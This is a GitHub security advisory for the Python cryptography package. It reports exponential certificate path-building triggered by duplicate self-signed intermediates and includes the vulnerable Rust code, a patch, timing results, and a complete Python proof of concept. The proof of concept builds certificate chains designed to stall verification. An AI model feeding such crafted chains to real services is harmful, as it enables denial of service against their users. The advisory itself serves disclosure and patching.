# [H] python-cryptography: Duplicate self-signed intermediates can cause exponential path-building

## Summary
Severity: High
Advisory: GHSA-jwv3-5hgf-82ww
CVE: CVE-2026-69249
CWE: CWE-400
Ecosystem: PyPI
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-08-03
Source: https://github.com/advisories/GHSA-jwv3-5hgf-82ww
Type: github-advisory

## Affected
- PyPI: `cryptography` — affected >=0 <49.0.0

## Details
### Summary
When resolving invalid certificate chains that include duplicate copies of self-signed certificates, the processing recursively invokes the same candidate, leading to an exponential blowup. Although the limitation that the chain depth cannot exceed a specified maximum depth prevents unbounded recursion and guarantees termination, an attacker-controlled certificate chain can lead the processing to easily take more than 5s to reject in testing. This amplification could form the basis for a resource exhaustion denial of service attack.

This work was completed by Trail of Bits as part of the Patch The Planet project in collaboration with OpenAI. The finding was identified primarily by the Codex coding agent, and manually reviewed before submission. 

### Details
The core issue arises in the recursive nature of `build_chain_inner`, which does not de-duplicate against previously analyzed candidates.

```python
    fn build_chain_inner(
        &self,
        working_cert: &VerificationCertificate<'chain, B>,
        current_depth: u8,
        working_cert_extensions: &Extensions<'chain>,
        name_chain: NameChain<'_, 'chain>,
        budget: &mut Budget,
    ) -> ValidationResult<'chain, Chain<'chain, B>, B> {
        if let Some(nc) = working_cert_extensions.get_extension(&NAME_CONSTRAINTS_OID) {
            name_chain.evaluate_constraints(&nc.value()?, budget)?;
        }

        // Look in the store's root set to see if the working cert is listed.
        // If it is, we've reached the end.
        if self.store.contains(working_cert) {
            return Ok(vec![working_cert.clone()]);
        }

        // Check that our current depth does not exceed our policy-configured
        // max depth. We do this after the root set check, since the depth
        // only measures the intermediate chain's length, not the root or leaf.
        if current_depth > self.policy.max_chain_depth {
            return Err(ValidationError::new(ValidationErrorKind::Other(
                "chain construction exceeds max depth".into(),
            )));
        }

        // Otherwise, we collect a list of potential issuers for this cert,
        // and continue with the first that verifies.
        let mut last_err: Option<ValidationError<'_, B>> = None;
        for issuing_cert_candidate in self.potential_issuers(working_cert) {
            // A candidate issuer is said to verify if it both
            // signs for the working certificate and conforms to the
            // policy.
            let issuer_extensions = issuing_cert_candidate.certificate().extensions()?;
            match self.policy.valid_issuer(
                issuing_cert_candidate,
                working_cert,
                current_depth,
                &issuer_extensions,
            ) {
                Ok(_) => {
                    match self.build_chain_inner(
```

A sufficient patch is to track valid issuers, and to skip seen ones before recursing. By tracking valid issuers only, validation and custom extension-policy callbacks still run.

```rust
          let mut seen_valid_issuers = Vec::<&VerificationCertificate<'chain, B>>::new();
          for issuing_cert_candidate in self.potential_issuers(working_cert) {
          . . .
                  Ok(_) => {
                      if seen_valid_issuers.contains(&issuing_cert_candidate) {
                         continue;
                      }
                      seen_valid_issuers.push(issuing_cert_candidate);
 
                      match self.build_chain_inner(
                          issuing_cert_candidate,
                          // NOTE(ww): According to RFC 5280, we should only
```

In testing, this fix removed the exponential blowup without breaking apparent correctness. 

```
duplicates,max_depth,result,seconds
1,7,rejected,0.000464 -> 1,7,rejected,0.000667
2,7,rejected,0.025154 -> 2,7,rejected,0.001229
3,7,rejected,0.489924 -> 3,7,rejected,0.001619 
4,7,rejected,4.309403 -> 4,7,rejected,0.002144
3,8,rejected,1.468193 -> 3,8,rejected,0.001811
4,8,timeout>5s,       -> 4,8,rejected,0.002410
5,7,timeout>5s,       -> 5,7,rejected,0.002640
6,6,timeout>5s,       -> 6,6,rejected,0.002829
```

### PoC
The following script benchmarks processing times for malicious cert chains.

```python
import datetime
import multiprocessing
import time

import cryptography
from cryptography import x509
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.x509.oid import ExtendedKeyUsageOID, NameOID
from cryptography.x509.verification import (
    DNSName,
    PolicyBuilder,
    Store,
    VerificationError,
)

NOW = datetime.datetime(2024, 1, 1, tzinfo=datetime.timezone.utc)
TIMEOUT = 5
CA_KEY_USAGE = x509.KeyUsage(
    digital_signature=True,
    content_commitment=False,
    key_encipherment=False,
    data_encipherment=False,
    key_agreement=False,
    key_cert_sign=True,
    crl_sign=True,
    encipher_only=False,
    decipher_only=False,
)
EE_KEY_USAGE = x509.KeyUsage(
    digital_signature=True,
    content_commitment=False,
    key_encipherment=False,
    data_encipherment=False,
    key_agreement=False,
    key_cert_sign=False,
    crl_sign=False,
    encipher_only=False,
    decipher_only=False,
)

def name(common_name):
    return x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, common_name)])

def base_builder(subject, issuer, public_key, serial):
    return (
        x509.CertificateBuilder()
        .subject_name(subject)
        .issuer_name(issuer)
        .public_key(public_key)
        .serial_number(serial)
        .not_valid_before(NOW - datetime.timedelta(days=1))
        .not_valid_after(NOW + datetime.timedelta(days=30))
    )

def make_ca(common_name, serial):
    private_key = ec.generate_private_key(ec.SECP256R1())
    subject = name(common_name)
    cert = (
        base_builder(subject, subject, private_key.public_key(), serial)
        .add_extension(x509.BasicConstraints(ca=True, path_length=None), True)
        .add_extension(CA_KEY_USAGE, True)
        .add_extension(
            x509.SubjectKeyIdentifier.from_public_key(private_key.public_key()),
            False,
        )
        .sign(private_key, hashes.SHA256())
    )
    return private_key, cert

def make_leaf(issuer_key, issuer_cert):
    private_key = ec.generate_private_key(ec.SECP256R1())
    return (
        base_builder(name("leaf"), issuer_cert.subject, private_key.public_key(), 100)
        .add_extension(x509.BasicConstraints(ca=False, path_length=None), True)
        .add_extension(EE_KEY_USAGE, True)
        .add_extension(x509.SubjectAlternativeName([x509.DNSName("example.com")]), False)
        .add_extension(
            x509.AuthorityKeyIdentifier.from_issuer_public_key(issuer_key.public_key()),
            False,
        )
        .add_extension(x509.ExtendedKeyUsage([ExtendedKeyUsageOID.SERVER_AUTH]), False)
        .sign(issuer_key, hashes.SHA256())
    )

def build_material():
    looping_key, looping_ca = make_ca("looping self-signed CA", 1)
    _, unrelated_root = make_ca("unrelated trust anchor", 2)
    leaf = make_leaf(looping_key, looping_ca)
    return leaf, looping_ca, unrelated_root

def verify_case(duplicates, max_depth, queue):
    leaf, looping_ca, unrelated_root = build_material()
    verifier = (
        PolicyBuilder()
        .store(Store([unrelated_root]))
        .time(NOW)
        .max_chain_depth(max_depth)
        .build_server_verifier(DNSName("example.com"))
    )

    start = time.perf_counter()
    try:
        verifier.verify(leaf, [looping_ca] * duplicates)
        result = "accepted"
    except VerificationError:
        result = "rejected"
    queue.put((result, time.perf_counter() - start))

def run_case(duplicates, max_depth):
    queue = multiprocessing.Queue()
    process = multiprocessing.Process(
        target=verify_case,
        args=(duplicates, max_depth, queue),
    )
    process.start()
    process.join(TIMEOUT)

    if process.is_alive():
        process.terminate()
        process.join()
        print(f"{duplicates},{max_depth},timeout>{TIMEOUT}s,")
        return

    result, elapsed = queue.get()
    print(f"{duplicates},{max_depth},{result},{elapsed:.6f}")

if __name__ == "__main__":
    print("duplicates,max_depth,result,seconds")
    for case in [(1, 7), (2, 7), (3, 7), (4, 7), (3, 8), (4, 8), (5, 7), (6, 6)]:
        run_case(*case)
```

### Impact
This issue exposes an amplification pathway over data that in many applications may be user-controlled, leading to the possibility of a denial of service through resource exhaustion. As the correctness of validation is not affected, the integrity of a system cannot be compromised through this vector, only its availability.

## References
- https://github.com/pyca/cryptography/security/advisories/GHSA-jwv3-5hgf-82ww
- https://github.com/pyca/cryptography/pull/14960
- https://github.com/pyca/cryptography/commit/4a12cf49675a184e47f912b00b04f3a629283582
- https://github.com/pyca/cryptography
